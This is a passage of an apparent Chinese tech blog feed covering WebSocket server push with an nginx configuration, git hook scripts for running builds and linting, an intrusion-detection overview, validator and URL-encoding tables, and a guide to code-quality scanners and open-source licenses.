        <content type="html"><![CDATA[<p>在邮件、消息等场景下需要使用服务器推方案，用于在  web 上和用户实时交互。</p><p>一般有几种方案：</p><ol><li>HTTP 轮询</li><li>HTTP stram 或 polling 技术 （Comet 技术）</li><li>Websocket 技术</li><li>HTTP/2 Server push 技术</li></ol><h2 id="HTTP-轮询"><a href="#HTTP-轮询" class="headerlink" title="HTTP 轮询"></a>HTTP 轮询</h2><p>轮询的原理非常简单，让浏览器每隔几秒就向服务器发送一个请求，询问服务器是否有新的信息。</p><p>这种方案也是最早期的方案，带来的问题是服务器资源消耗较大。</p><p>连接的建立和销毁是比较耗费资源的行为。</p><h2 id="HTTP-stram-或-polling-技术-（Comet-技术）"><a href="#HTTP-stram-或-polling-技术-（Comet-技术）" class="headerlink" title="HTTP stram 或 polling 技术 （Comet 技术）"></a>HTTP stram 或 polling 技术 （Comet 技术）</h2><p>Comet 技术和轮询差不多，不过采取的是阻塞模型，方法是客户端发起一个请求后，服务器挂起，等到需要服务器推送数据时返回 http 数据。返回数据后，客户端再次发起请求。</p><p>这种技术会造成服务器线程长时间挂起，因此在服务器阻塞网络模型时性能变得非常差，因为这种方案一般没有兼容性的问题，可以在性能和实现成本上是一个比较好的取舍。</p><h2 id="WebSocket-技术"><a href="#WebSocket-技术" class="headerlink" title="WebSocket 技术"></a>WebSocket 技术</h2><p>WebSocket协议（RFC 6455）提供了一种标准化的浏览器、服务器双工通信方法，通过一个TCP连接在客户机和服务器之间建立全双工、双向的通信通道。它是一种不同于 HTTP 的 TCP 协议，但设计用于在 HTTP 上工作，使用端口 80 和 443。因为可以重用端口，可以重用现有的防火墙。</p><p>WebSocket交互从一个HTTP请求开始，该请求使用HTTP升级报头进行升级，切换 WebSocket协议。</p><p>Websocket 协议只是借用了 HTTP 协议作为协议切换，建立信道后 HTTP 不在有关系。</p><p>客户端发起协议切换请求：</p><pre><code class="http">GET /spring-websocket-portfolio/portfolio HTTP/1.1Host: localhost:8080Upgrade: websocket Connection: Upgrade Sec-WebSocket-Key: Uc9l9TMkWGbHFD2qnFHltg==Sec-WebSocket-Protocol: v10.stomp, v11.stompSec-WebSocket-Version: 13Origin: http://localhost:8080</code></pre><p>服务器成功切换协议后返回状态码 101 而非 200：</p><pre><code class="http">HTTP/1.1 101 Switching Protocols Upgrade: websocketConnection: UpgradeSec-WebSocket-Accept: 1qVdfYHU9hPOl4JYYNXF623Gzn0=Sec-WebSocket-Protocol: v10.stomp</code></pre><h3 id="WebSocket-和-HTTP-协议的关系"><a href="#WebSocket-和-HTTP-协议的关系" class="headerlink" title="WebSocket 和 HTTP 协议的关系"></a>WebSocket 和 HTTP 协议的关系</h3><p>尽管 WebSocket 被设计为与 HTTP 兼容，并从 HTTP 请求开始，但重要的是要理解这两个协议导致了非常不同的体系结构和应用程序编程模型。</p><p>在HTTP 和 REST 中，应用程序被建模为许多 url 。为了与应用程序交互，客户端访问这些url，请求-响应样式。服务器根据HTTP URL、方法和标头将请求路由到适当的处理程序。</p><p>相反，在WebSockets中，初始连接通常只有一个URL。随后，所有应用程序消息都在同一TCP连接上流动。这指向一个完全不同的异步、事件驱动的消息传递体系结构。</p><p>WebSocket 实际上是一种传输层协议，与 HTTP 不同，它不对消息的内容规定任何语义。这意味着，除非客户机和服务器在消息语义上达成一致，否则无法路由或处理消息。</p><p>WebSocket 客户端和服务器可以通过 HTTP 握手请求上的 <code>Sec-WebSocket-Protocol</code> 头协商使用更高级别的消息传递协议(例如，STOMP)。在这种情况下，他们需要制定自己的惯例。</p><h3 id="WebSocket-和-STOMP-协议"><a href="#WebSocket-和-STOMP-协议" class="headerlink" title="WebSocket 和 STOMP 协议"></a>WebSocket 和 STOMP 协议</h3><h3 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h3><p>后端</p><p>Java：</p><p>SpringBoot</p><p>Nodejs</p><p>前端：</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p><strong>在合适的场景下使用 WebSocket</strong> </p><p>低延迟、高频率和高容量是 WebSocket 特点，如果应用对延迟要求并不高，WebSocket 会带来额外的编程复杂度，并不见得是比轮询更好地方案。</p><p><strong>反向代理和运营商网络要求</strong></p><p>如果 WebSocket 服务器运行在 web 服务器(例如nginx)之后，可能需要将其配置为将 WebSocket 升级请求传递给WebSocke t服务器。同样，如果应用程序在云环境中运行，请检查云提供商与 WebSocket 支持相关的说明。</p><pre><code class="nginx">server {      listen   80;      server_name example.com;      location / {        proxy_pass   http://127.0.0.1:8080/;  　　　　proxy_http_version 1.1;        proxy_read_timeout   3600s;        // 启用支持 websocket 连接        proxy_set_header Upgrade $http_upgrade;        proxy_set_header Connection &quot;upgrade&quot;;      }}</code></pre><p>需要特别注意的是，Nginx 等反向代理服务器一定要将 <code>Upgrade</code> 相关的头转发出去，否则无法建立起来连接。这个问题非常难调试。</p><pre><code class="nginx">       proxy_set_header Upgrade $http_upgrade;       proxy_set_header Connection &quot;upgrade&quot;;</code></pre><p><strong>wss 和 ws 协议头</strong></p><p>在建立连接时如果使用的 http 协议，则对应发送消息的协议为 ws，如果使用 https 协议建立的链接，则发送消息的协议为 wss。</p><p>同时需要注意，wss 还是需要配置相关证书。</p><p><strong>跨域</strong></p><p>WebSocket 协议没有同源策略，但是建立连接的 http 请求有同源策略，需要配置跨域访问。</p><h2 id="HTTP-2-Server-push-技术"><a href="#HTTP-2-Server-push-技术" class="headerlink" title="HTTP/2 Server push 技术"></a>HTTP/2 Server push 技术</h2>]]></content>
      
      
      <categories>
          
          <category> 技术方案 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Nodejs 热重启工具</title>
      <link href="/nodejs/nodejs/nodemon/"/>
      <url>/nodejs/nodejs/nodemon/</url>
      
        <content type="html"><![CDATA[<p>在开发环境下，往往需要一个工具来自动重启项目工程，之前接触过 python 的 supervisor，现在写 node 的时候发现 supervisior 在很多地方都有他的身影，node 也有一个 npm 模块 supervisior 也是用来监控进程的，不过除了 supervisior 外，还有很多其他的工具，从 github 的评分上看。</p><h2 id="工具清单"><a href="#工具清单" class="headerlink" title="工具清单"></a>工具清单</h2><ul><li>nodemon</li><li>forever</li><li>node-dev</li><li>supervisior</li></ul><p>较常用的是 nodemon</p>]]></content>
      
      
      <categories>
          
          <category> nodejs </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>基于服务端 store 模式的多用户实时协作方案</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/real-time/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/real-time/</url>
      
        <content type="html"><![CDATA[<h2 id="解决的问题"><a href="#解决的问题" class="headerlink" title="解决的问题"></a>解决的问题</h2><p>在很多系统中都有一些实时交互需求，例如 A 用户拖动一个图标，B 用户需要能实时感知。这对前后端开发都有较大的挑战，带来非常大的技术挑战。</p><p>另外也有一些基本的实时协作的需求，例如收到服务器的通知，然后展示出小红点。</p><h2 id="主要技术选型"><a href="#主要技术选型" class="headerlink" title="主要技术选型"></a>主要技术选型</h2><ul><li>store 模式前端简化交互</li><li>服务器 store 模式获得最终数据交互</li><li>通过 websocket 订阅 event 传送</li><li>通过 kafka 实现多播</li><li>通过 nodejs 作为后端同构语言，用于响应式编程</li><li>使用 MongoDB 作为文档数据库（取决于业务类型）</li><li>前后端使用同一事件处理代码</li></ul><h2 id="WebSocket-技术背景"><a href="#WebSocket-技术背景" class="headerlink" title="WebSocket 技术背景"></a>WebSocket 技术背景</h2>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>入侵检测系统</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/intrusion-detection/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/intrusion-detection/</url>
      
        <content type="html"><![CDATA[<h2 id="入侵检测系统（IDS）"><a href="#入侵检测系统（IDS）" class="headerlink" title="入侵检测系统（IDS）"></a>入侵检测系统（IDS）</h2><pre><code>IDS是计算机的监视系统，它通过实时监视系统，一旦发现异常情况就发出警告。 [1]  以信息来源的不同和检测方法的差异分为几类：根据信息来源可分为基于主机IDS和基于网络的IDS，根据检测方法又可分为异常入侵检测和误用入侵检测。不同于防火墙，IDS入侵检测系统是一个监听设备，没有跨接在任何链路上，无须网络流量流经它便可以工作。因此，对IDS的部署，唯一的要求是：IDS应当挂接在所有所关注流量都必须流经的链路上。在这里，&quot;所关注流量&quot;指的是来自高危网络区域的访问流量和需要进行统计、监视的网络报文。在如今的网络拓扑中，已经很难找到以前的HUB式的共享介质冲突域的网络，绝大部分的网络区域都已经全面升级到交换式的网络结构。因此，IDS在交换式网络中的位置一般选择在尽可能靠近攻击源或者尽可能靠近受保护资源的位置。这些位置通常是：服务器区域的交换机上；Internet接入路由器之后的第一台交换机上；重点保护网段的局域网交换机上。由于入侵检测系统的市场在近几年中飞速发展，许多公司投入到这一领域上来。Venustech(启明星辰）、Internet Security System（ISS）、思科、赛门铁克等公司都推出了自己的产品。</code></pre><h2 id="可用的开源方案-OSSEC"><a href="#可用的开源方案-OSSEC" class="headerlink" title="可用的开源方案 (OSSEC)"></a>可用的开源方案 (OSSEC)</h2><p>OSSEC是一款开源的多平台的入侵检测系统，可以运行于Windows, Linux, OpenBSD/FreeBSD,</p><p>以及 MacOS等操作系统中。主要功能有日志分析、完整性检查、rootkit检测、基于时间的警报和主动响应。</p><p>除了具有入侵检测系统功能外，它还一般被用在SEM/SIM（安全事件管理（SEM： Security Event Management）/</p><p>安全信息管理（SIM：SecurityInformation Management））解决方案中。因其强大的日志分析引擎，</p><p>ISP（Internet service provider）（网络服务提供商）、大学和数据中心用其监控和分析他们的防火墙、</p><p>入侵检测系统、网页服务和验证等产生的日志。</p><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li>OSSEC 使用文档 <a href="https://www.ossec.net/docs/" target="_blank" rel="noopener">https://www.ossec.net/docs/</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Hibernate bean 验证器</title>
      <link href="/hibernate/hibernate/hibernate-validator/"/>
      <url>/hibernate/hibernate/hibernate-validator/</url>
      
        <content type="html"><![CDATA[<h2 id="JSR-380-Hibernate-validator"><a href="#JSR-380-Hibernate-validator" class="headerlink" title="JSR 380 Hibernate-validator"></a>JSR 380 Hibernate-validator</h2><p>Bean Validation 遵循 Bean Validation 2.0 规范，基于 JSR 380 实现。</p><p>常见的验证器有：</p><table><thead><tr><th>注解</th><th>作用</th></tr></thead><tbody><tr><td>@Valid</td><td>被注释的元素是一个对象，需要检查此对象的所有字段值</td></tr><tr><td>@Null</td><td>被注释的元素必须为 null</td></tr><tr><td>@NotNull</td><td>被注释的任何元素必须不为 null</td></tr><tr><td>@AssertTrue</td><td>被注释的元素必须为 true</td></tr><tr><td>@AssertFalse</td><td>被注释的元素必须为 false</td></tr><tr><td>@Min(value)</td><td>被注释的元素必须是一个数字，其值必须大于等于指定的最小值</td></tr><tr><td>@Max(value)</td><td>被注释的元素必须是一个数字，其值必须小于等于指定的最大值</td></tr><tr><td>@DecimalMin(value)</td><td>被注释的元素必须是一个数字，其值必须大于等于指定的最小值</td></tr><tr><td>@DecimalMax(value)</td><td>被注释的元素必须是一个数字，其值必须小于等于指定的最大值</td></tr><tr><td>@Negative</td><td>被注释的元素必须是一个负数</td></tr><tr><td>@NegativeOrZero</td><td>被注释的元素必须是负数或 0</td></tr><tr><td>@Positive</td><td>被注释的元素必须是一个正数</td></tr><tr><td>@PositiveOrZero</td><td>被注释的元素必须是一个正数或 0</td></tr><tr><td>@Size(max, min)</td><td>被注释的元素的大小必须在指定的范围内</td></tr><tr><td>@Digits (integer, fraction)</td><td>被注释的元素必须是一个数字，其值必须在可接受的范围内</td></tr><tr><td>@Past</td><td>被注释的元素必须是一个过去的日期</td></tr><tr><td>@PastOrPresent</td><td>被注释的元素必须是一个过去或当前的日期</td></tr><tr><td>@Future</td><td>被注释的元素必须是一个将来的日期</td></tr><tr><td>@FutureOrPresent</td><td>被注释的元素必须是一个将来或当前的日期</td></tr><tr><td>@Pattern(value)</td><td>被注释的元素必须符合指定的正则表达式</td></tr><tr><td>@NotEmpty</td><td>集合对象的元素不为0，即集合不为空，也可以用于字符串不为 null</td></tr><tr><td>@NotBlank</td><td>只能用于字符串不为null，并且字符串trim()以后length要大于0</td></tr><tr><td>@Email</td><td>被注释的元素必须是一个有效的邮箱地址</td></tr></tbody></table><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.csdn.net/y550918116j/article/details/78258916" target="_blank" rel="noopener">https://blog.csdn.net/y550918116j/article/details/78258916</a></li><li><a href="https://beanvalidation.org/" target="_blank" rel="noopener">https://beanvalidation.org/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> hibernate </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>URL 字符编码</title>
      <link href="/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1/network/url-encode/"/>
      <url>/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1/network/url-encode/</url>
      
        <content type="html"><![CDATA[<h2 id="URL-中需要编码的字符"><a href="#URL-中需要编码的字符" class="headerlink" title="URL 中需要编码的字符"></a>URL 中需要编码的字符</h2><table><thead><tr><th>字符</th><th>转义码</th><th>URL中用途</th><th></th></tr></thead><tbody><tr><td>+</td><td>%2B</td><td>URL 中+号表示空格</td><td></td></tr><tr><td>/</td><td>%2F</td><td>分隔目录和子目录</td><td></td></tr><tr><td>?</td><td>%3F</td><td>分隔实际的 URL 和参数</td><td></td></tr><tr><td>%</td><td>%25</td><td>指定特殊字符</td><td></td></tr><tr><td>#</td><td>%23</td><td>锚点</td><td></td></tr><tr><td>&amp;</td><td>%26</td><td>URL 中指定的参数间的分隔符</td><td></td></tr><tr><td>=</td><td>%3D</td><td>URL 中指定参数的值</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 网络通信 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用git钩子对提交代码进行检查</title>
      <link href="/git/git/git-hooks/"/>
      <url>/git/git/git-hooks/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>git hooks 是一些自定义的 shell 脚本，用于 git 提交某个生命周期中执行，用于控制 git 工作的流程，分为客户端钩子和服务。</p><p>客户端钩子：</p><ul><li><p>pre-commit</p></li><li><p>prepare-commit-msg</p></li><li><p>commit-msg</p></li><li><p>post-commit</p></li></ul><p>服务器端钩子：</p><ul><li><p>pre-receive</p></li><li><p>post-receive</p></li><li><p>update</p></li></ul><p>一般我们会通过配置<code>pre-commit</code> 到项目中，约束团队成员提交代码时候进行一些检查，例如：</p><ul><li>运行单元测试</li><li>运行代码检查，例如 checkstyle、eslint 等</li><li>提交的 commit 信息检查</li></ul><p>如果有 git 服务器配置权限，也可以通过配置 <code>pre-receive</code> 在服务器端运行检查。</p><h2 id="pre-commit"><a href="#pre-commit" class="headerlink" title="pre-commit"></a>pre-commit</h2><p>pre-commit 是一个比较常用的钩子，可以用于提交代码前执行。例如运行构建、测试或者质量检查等。</p><p><strong>Java Gradle 的一个 pre-commit 脚本</strong></p><pre><code class="shell">#!/bin/sh# From gist at https://gist.github.com/chadmaughan/5889802set -x# run the tests with the gradle wrapper./gradlew clean build# store the last exit code in a variableRESULT=$?# return the &#39;./gradlew build&#39; exit codeexit $RESULTs</code></pre><p>在项目的根目录中添加 <code>pre-commit</code> 文件，通过配置 <code>gradle</code> 脚本在项目初始话时安装该 <code>hook</code></p><pre><code class="groovy">task installGitHooks(type: Copy) {    from new File(rootProject.rootDir, &#39;pre-commit&#39;)    into {        new File(rootProject.rootDir, &#39;.git/hooks&#39;)    }    fileMode 0755}build.dependsOn installGitHooks</code></pre><p><strong>前端的一个 pre-commit 脚本</strong></p><pre><code class="shell">#!/bin/shSTAGE_FILES=$(git diff --cached --name-only --diff-filter=ACM -- &#39;*.vue&#39; &#39;*.js&#39;)set -xPASS=truefor FILE in $STAGE_FILESdo    ./node_modules/.bin/eslint $FILE    if [[ &quot;$?&quot; == 1 ]]; then        PASS=false    fidoneif ! $PASS; then  echo &quot;lint running failed！&quot;  exit 1</code></pre><p>同样的，将该 <code>pre-commit</code> 放到项目根目录中，通过 <code>npm postinstall</code> 钩子安装。</p><pre><code class="json">&quot;scripts&quot;: {  &quot;postinstall&quot;: &quot;cp pre-commit .git/hooks&quot;},</code></pre><h2 id="pre-receive"><a href="#pre-receive" class="headerlink" title="pre-receive"></a>pre-receive</h2><p>服务器上的 <code>hooks</code> 目录为 <code>.git/custom_hooks</code> 需要，注意是否授予当前服务具有可执行权限。</p><p>下面就是一个检查 <code>git commit</code> 信息的脚本：</p><pre><code class="sh">#!/bin/bashset -eo pipefailrefname=&quot;$0&quot;oldrev=&quot;$1&quot;newrev=&quot;$2&quot;echo &quot;Enforcing Policies...&quot;# Iterate over all the commitsfor commit in $(git rev-list 538c33..d14fc7); do  git cat-file commit &quot;${commit}&quot; | sed &#39;1,/^$/d&#39; | your-validatordone </code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><p>官方文档 <a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">https://git-scm.com/book/zh/v2</a></p></li><li><p><a href="https://stackoverflow.com/questions/39419360/git-pre-receive-hook-to-check-commit-message" target="_blank" rel="noopener">https://stackoverflow.com/questions/39419360/git-pre-receive-hook-to-check-commit-message</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title></title>
      <link href="/uncategorized/team/normalize/"/>
      <url>/uncategorized/team/normalize/</url>
      
        <content type="html"><![CDATA[<pre><code>title: 软件项目规范化指南categories: teamtoc: truerecommened: true</code></pre><p>对于一个软件开发团队，可以通过哪些代码质量指标和扫描方法让团队产出规范、安全、高质量的代码？让开发团队运行的安全、透明、可靠？</p><p>最近参与了某著名通信设备公司的软件研发合规运动，虽然对于一线开发团队来说是一件非常痛苦的事情，但是不得不被该公司的执行力和决心所折服。本文总结了其中一些实践和工具，包含常见代码质量扫描工具、代码质量指标、第三方依赖管理、安全运维等几个方面，主要适用于 Java/JavaScript 技术栈的 web 项目，希望对于想要规范化自己的项目的 Tech Lead 有所帮助。</p><p><strong>代码扫描和常见质量指标</strong></p><p>“祸患常积于忽微”，往往一些奇怪的 bug 都是一些不规范的小问题造成的。这里整理了一些常见的扫描工具和代码质量指标，可以在搭建项目基础设施时引入，用于自动化的检查代码中潜在的问题，达到控制代码产出质量的目的，</p><p><strong>扫描工具</strong></p><p><strong>checkstyle</strong></p><p>checkstyle 是常用于 java 项目的扫描工具，检查源代码是否与代码规范相符，检查项目主要包括：Javadoc 注释、imports、过长的类和方法、空格、重复文件、圈复杂度等，默认使用 sun 的代码规则，也可以配置自定义的代码规则，例如阿里就发布了相应的检查规则。</p><p><strong>findbugs</strong> </p><p>通过 Bug Patterns 的概念，寻找代码中可能出现的 bug，检查项目主要包括：不良编程习惯导致的问题、性能问题、安全问题、线程问题等。例如，应使用 equals 判断相等，而不是 “ =” 操作符、流需要关闭、线程资源需要释放等问题。findbugs 的模式库对编程经验也有较好的提升作用。还可以导入和编写自己的 Bug Patterns 完善检查机制。</p><p><strong>simian</strong></p><p>simian 是一个用于检查重复和相似代码的工具，它的重复检查类似于论文查重，会提示一定的相似度。可以单独运行，也可以作为 checkstyle 插件来使用，相对来来说比较小众。</p><p><strong>pmd</strong></p><p>pmd 是一款跨语言的通用静态扫描工具，具备一部分 checkstyle、findbugs 的功能，不再赘述。</p><p><strong>ESlint/TSlint</strong></p><p>前端界的 checkstyle , TSlint 设计用来做 TypeScript 类型检查，ESlint 作为代码风格检查工具。不过现在 ESlint 也提供了TypeScript 类型检查功能，基本上 ESlint 能整合这两个功能。由于性能问题， TypeScript 也采用了 ESLint 作为 TSlint替代的检查工具。</p><p><strong>SonarQube</strong></p><p>SonarQube 是一款用于代码质量管理的开源工具，它主要用于管理源代码的质量。 SonarQube 和上面的工具不太一样，SonarQube 设计目的是提供一个平台，通过插件的方式提供对各个语言进行支持，也可以和 checkstyle、pmd、simian 等工具进行集成。SonarQube 一般需要单独部署成一个服务，提供数据库，可以记录扫描结果等信息。</p><p><strong>npm audit</strong></p><p>npm audit 是 npm 6 之后的版本 自带的一个前端安全扫描工具，可以扫描 npm 依赖中的潜在的漏洞威胁。这些引入的漏洞可能威胁用户开发的机，另外也可能被带入 bundle 文件发布到线上，带来安全问题。目前 npm audit 会在 npm install 完成后自动执行，需要留意安全威胁报告</p><p><strong>Fortify SCA</strong></p><p>Fortify SCA(Source Code Analyzer) 是一款非常优秀的代码安全扫描工具，用于分析代码中潜在的安全问题。通过调用语言的编译器或者解释器把代码（Java、C、C++等源代码）转换成一种中间媒体文件 NST（Normal Syntax Trcc），然后通过模式匹配相关的方式抓取存在于漏洞库中的漏洞。例如，上传的文件没有做检查等 XSS 攻击。</p><p><strong>OWASP  Dependency-Track</strong></p><p>开放式 Web 应用程序安全项目（OWASP）是一个非营利组织，提供了很多安全标准、数据库、社区和培训。其中一个工具就是 OWASP  Dependency-Track，可以对第三方依赖包中的知名漏洞进行检查，扫描结果受到漏洞数据库的更新影响。</p><p><strong>archunit 架构规范检查</strong></p><p>前面的检查是代码层面，archunit 可以用于代码架构检查，可以定义规则检查每个包中的实现是否符合规范。例如，controller 包中的类不能实现 service 的接口，repository 下的类必须实现 Repository 接口。通过 archunit 可以减少 codereview 的工作量，避免项目的结构被破坏。</p><p><strong>统计工具</strong></p><p>sloccount、sourcemointor 这两个工具可以用于统计代码数量，包括行数、文件数、注释等。除了在项目中扫描 bug 之外，配置代码统计工具可以对项目有一个整体的认知。</p><p>其他的扫描工具还很多，例如 coverity、codemars、binscope、synk、appscan、retire.js 等工具，不再一一列举。</p><p><strong>最佳搭配</strong></p><p>这几款工具之间的功能有所重叠，在实际工作中，我们可以根据上面推荐的关注的点，重点清除这些问题。这些扫描工具全部用上除了会带来团队压力和维护成本之外，代码质量不会随着引入的插件增多。除开有质量团队的大厂提供这些扫描平台外，敏捷团队往往不会太大，团队持续关注一个精简的扫描组合更好。</p><p>Java 后端：</p><ol><li><strong>checkstyle</strong> Java 代码风格守护，Java 项目至少应该配置一个默认的 checkstyle 规则。至少让项目干净，没有无用、重复的代码，以及超大的类和方法。建议做到每次提交代码前检查。</li><li><strong>findbugs</strong> 常见不规范的代码检查，一些空指针、equals 检查非常有用，而且 IDE  的插件也很好用。</li></ol><p>前端：</p><ol><li><strong>eslint</strong> 守护 JavaScript 代码风格，eslint 搭配一个 .editorconfig ，可以方便的让编辑器保持同 eslint 一致的代码风格。</li><li><strong>npm audit</strong> 项目中第三方包的威胁扫描，npm 自带无需额外安装，npm 6 以后自运行，需要关注并修复报出的安全问题。</li></ol><p>安全：</p><ol><li><strong>fortify</strong> 扫描代码中的漏洞，用它检查出来的大部分安全问题都是注入攻击、XSS 等攻击，这些问题明显可以在开发过程中避免。可以作为 Jenkins 插件配置，和单元测试作为同一阶段运行。</li><li><strong>OWASP 插件</strong>  用来扫描第三方依赖漏洞，因为项目中的依赖不会像源代码一样频繁变化，推荐使用 Jekins 插件，定期执行即可。</li></ol><p>为什么不用 SonarQube 呢，SonarQube 是一个非常优秀的代码质量开放平台，需要单独的配置安装，需要花费额外的时间维护，对于小团队来说成本较高，如果有专门的质量团队可以考虑维护一套。</p><p><strong>常用代码质量指标参考</strong></p><ol><li><strong>编译告警数</strong>，大部分程序员基本上忽略 warning，但是编译器出现了告警是一种不好的体现，意味着软件可能工作，但是存在不好的实践，而这种不确定性，会带来不确定的 bug 最终让人一头雾水。编译过程中的告警，尽量消除掉，编译告警的值推荐消除到 0。</li><li><strong>平均函数代码行数</strong>，过大的函数会导致阅读困难，而且往往过大的函数职责不够单一，一般将一个方法代码行数控制到 30 - 50 行。</li><li><strong>平均文件代码行</strong>，和平均函数代码行一样，过长的文件一样难以维护，一般一个文件10多个方法，因此文件的代码行数一般控制到 300 - 500 行。</li><li><strong>冗余代码</strong>，有时候我们代码中可能存在未使用的方法、变量等代码，这让维护者一头雾水，通常需要清零。</li><li><strong>总文件重复率</strong>，出现重复文件的次数。除了编写单元测试的情况下，业务代码不应该出现重复代码，推荐值为 0。</li><li><strong>总代码重复度</strong>，代码的重复度检查，限于扫描工具的识别模式，需要有一定的容忍度，推荐值在 5% - 10%</li><li><strong>平均函数圈复杂度</strong>，圈复杂度用来衡量一个模块判定结构的复杂程度。如果一个方法内部有大量的 if 语句嵌套，意味着这个方法的实现质量低下，且程序复杂度高不利于维护，推荐值小于 5%。</li><li><strong>安全告警</strong>，如果配置了安全扫描工具，例如 Fortify，安全威胁应该被清零。</li><li><strong>代码缺陷</strong>，如果配置了缺陷扫描工具，例如 Findbus，需要清零。</li></ol><table><thead><tr><th>检查项</th><th>建议的扫描工具</th><th>推荐值</th></tr></thead><tbody><tr><td>代码风格检查</td><td>checkstyle/eslint</td><td>0</td></tr><tr><td>编译告警数</td><td>checkstyle</td><td>0</td></tr><tr><td>平均函数代码行</td><td>checkstyle</td><td>30-50</td></tr><tr><td>平均文件代码行</td><td>checkstyle</td><td>300-500</td></tr><tr><td>冗余代码</td><td>checkstyle</td><td>0</td></tr><tr><td>总文件重复率</td><td>checkstyle</td><td>0</td></tr><tr><td>总代码重复度</td><td>checkstyle</td><td>5% - 10%</td></tr><tr><td>平均函数圈复杂度</td><td>checkstyle</td><td>&lt;=5%</td></tr><tr><td>安全告警</td><td>sonarqube/fortify</td><td>0</td></tr><tr><td>代码缺陷</td><td>findbugs</td><td>0</td></tr></tbody></table><p><strong>第三方依赖规范化</strong></p><p>软件开发过程中，不可避免的需要引入第三方或者开源软件包作为库或者框架引入。“第三方” 其实不是一个软件工程术语，现今在软件行业里面的理解是：第一方为自研的软件，第二方为内部发布的软件，第三方为从社区或者外部商业途径引入的软件包。</p><p>对于个人开发者而言，面向“搜索引擎”编程往往将来源不明的代码片段和程序包引入到项目中。对于企业来说，考虑到的不仅仅是功能是否能实现，还要考虑引入时带来的成本和问题，例如是否需要授权、开源协议是否合理、是否会带来安全威胁。</p><p>企业对于第三方依赖的引入分为几种情况：</p><ol><li><strong>作为开发工具引入</strong>，例如 gcc、Jenkins，基本没有开源协议问题，但是需要注意开发机、CI 会有安全风险。Jenkins 曾出现过漏洞，CI 服务器被当做远程矿机使用。</li><li><strong>作为服务部署使用（SaaS）</strong>，部分开源协议会限制这种使用方式，第三方依赖的安全问题会威胁服务器。</li><li><strong>通过软件包再发布</strong>，大部分开源软件对这种使用方式有较多要求，例如 GPL 开源协议具有传染性，要求使用了 GPL 的项目也要开源。</li><li><strong>拷贝源代码引入项目</strong>，非常不推荐这种方式，尽量通过包管理的方式引入。</li></ol><p>引入第三方依赖需要充分考虑，尽可能最小成本的引入。在一个 React 的前端项目中，有不熟悉的工程师，为了使用一个简单的手风琴效果，引入了整套 bootstrap。不仅破坏了使用 React 的最佳实践，而且让输出的 bundle 文件大小激增数倍，造成首屏加载的性能问题。</p><p><strong>常见商业友好的开源协议</strong></p><p>商业用户常用的开源协议实际上只有6种左右，即 LGPL、Mozilla、GPL、BSD、MIT、Apache，另外还有极其宽松的 The Unlicense，但采用的开源软件不多。</p><p>GitHub 提供了一个 license 清单的列表 <a href="https://choosealicense.com/licenses/，我根据开源协议的宽松程度，整理了一个列表，方便查看：" target="_blank" rel="noopener">https://choosealicense.com/licenses/，我根据开源协议的宽松程度，整理了一个列表，方便查看：</a></p><table><thead><tr><th>开源协议</th><th>简介</th><th>主要权利</th><th>主要条件</th></tr></thead><tbody><tr><td>MIT License</td><td>名称来源于麻省理工学院的许可协议</td><td>可商业使用，并用于盈利可再次发布允许修改源代码包含专利使用权利</td><td>保留版权信息</td></tr><tr><td>BSD</td><td>伯克利软件分发许可协议</td><td>可商业使用，并用于盈利可再次发布允许修改源代码包含专利使用权利</td><td>保留版权信息不可以用开源项目名字和作者用于商业推广</td></tr><tr><td>Apache License 2.0</td><td>Apache许可协议</td><td>可商业使用，并用于盈利可再次发布允许修改源代码包含专利使用权利</td><td>保留版权信息对源代码的修改需要提供文档说明</td></tr><tr><td>Mozilla Public License 2.0</td><td>Mozilla小组设计的许可协议</td><td>可商业使用，并用于盈利可再次发布允许修改源代码包含专利使用权利</td><td>保留版权信息基于该协议之上的项目需要采用相同的协议继续开源，但是开源范围只是改变的文件级别，无需整个项目开源</td></tr><tr><td>GNU LGPLv3</td><td>GUN 宽通用许可协议</td><td>可商业使用，并用于盈利可再次发布允许修改源代码包含专利使用权利</td><td>保留版权信息对源代码的修改需要提供文档说明基于该协议之上的项目需要采用相同的协议继续开源，如果使用library的方式可以不用开源</td></tr><tr><td>GNU GPLv3</td><td>GUN 